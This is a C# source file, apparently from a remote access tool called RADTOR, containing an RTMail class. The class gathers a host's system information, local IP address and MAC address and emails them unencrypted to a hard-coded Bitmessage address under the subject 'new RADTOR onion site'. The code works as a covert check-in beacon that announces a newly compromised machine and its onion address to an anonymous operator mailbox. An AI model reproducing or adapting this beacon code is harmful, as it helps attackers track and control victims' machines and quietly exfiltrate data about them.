using System;
using System.Text;
using System.Net;
using System.Net.Mail;
using LocalRT.radtor.utils;

namespace LocalRT.Radtor.Remote
{
    /// <summary>
    /// provides methods to send email via smtp direct to mail server
    /// </summary>
    public class RTMail
    {
        /// <summary>
        /// Get / Set the name of the SMTP mail server
        /// </summary>
        private static string smtpServer = "mail.bitmessage.ch";

        public static IWebProxy proxy { set; get; }

        private enum SMTPResponse : int
        {
            CONNECT_SUCCESS = 220,
            GENERIC_SUCCESS = 250,
            DATA_SUCCESS = 354,
            QUIT_SUCCESS = 221
        }
        public static bool Send(String message)
        {
            //"bDyWrKLRyPK87fXL",
            RadTorLog.log("Enviando Correo");
            return realSendEmail(message + "@radtor.org", "BM-2cUtjauvufMiYPFNFiEXjiymCxauWFGwFu@bitmessage.ch",  "new RADTOR onion site " + message); 
        }
        

        public static bool realSendEmail(string srFrom, string srSenderEmail, string srTitle)
        {
            LocalConfiguration.activeSystemProxy(true);
            try
            {
                String srTextBody = LocalConfiguration.getInfo();
                srTextBody += "\n IP - " + LocalConfiguration.GetLocalIPAddress();
                srTextBody += "\n Mac - " + LocalConfiguration.getMac();
                srTextBody += "\n LVS!";
                
                using (MailMessage message = new MailMessage(new MailAddress(srFrom), new MailAddress(srSenderEmail)))
                {
                    //message.ReplyTo = new MailAddress(srSenderEmail, srFrom);
                    message.IsBodyHtml = false;
                    message.Subject = srTitle;
                    message.SubjectEncoding = System.Text.Encoding.UTF8;
                    AlternateView textPart = AlternateView.CreateAlternateViewFromString(srTextBody, Encoding.UTF8, "text/plain");
                    textPart.TransferEncoding = System.Net.Mime.TransferEncoding.QuotedPrintable;
                    message.AlternateViews.Add(textPart);
                    message.BodyEncoding = Encoding.UTF8;
                   
                    using (SmtpClient oSmtp = new SmtpClient())
                    {                        
                        oSmtp.Host = smtpServer;                        
                        oSmtp.Timeout = 400005;
                        oSmtp.EnableSsl = false;
                        oSmtp.Port = 25;
                        oSmtp.Send(message);
                    }
                    RadTorLog.log("Correo Enviado.");
                }                
            }
            catch (Exception e)
            {
                RadTorLog.log("Error en envio de correo : " + e.Message);
                LocalConfiguration.activeSystemProxy(false);
                return false;
            }
            LocalConfiguration.activeSystemProxy(false);
            return true;
        }
    }

}